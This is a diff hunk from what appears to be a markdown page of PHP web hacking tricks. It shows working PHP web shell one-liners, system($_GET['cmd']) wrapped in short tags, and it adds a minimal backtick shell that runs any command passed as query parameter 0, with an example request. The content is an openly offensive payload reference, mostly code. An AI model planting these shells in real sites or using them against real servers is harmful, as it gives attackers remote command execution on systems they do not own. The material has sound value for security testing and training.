@@ -10,11 +10,18 @@ description: Some tricks specific to the PHP web programming language
 <?php system($_GET["cmd"]) ?>
 ```
 
-Bypass `<?php` with `<?=` or `<?`:
+Bypass `<?php` with `<?=`:
 
 ```php
 <?= system($_GET["cmd"]) ?>
 ```
+
+<pre class="language-php" data-title="Shortest"><code class="lang-php"><strong>&#x3C;?=`$_GET[0]`;
+</strong>
+<strong>&#x3C;?=`$_GET[0]`?>ANYTHING
+</strong>
+// Use /shell.php?0=id
+</code></pre>
 
 ### .htaccess
 
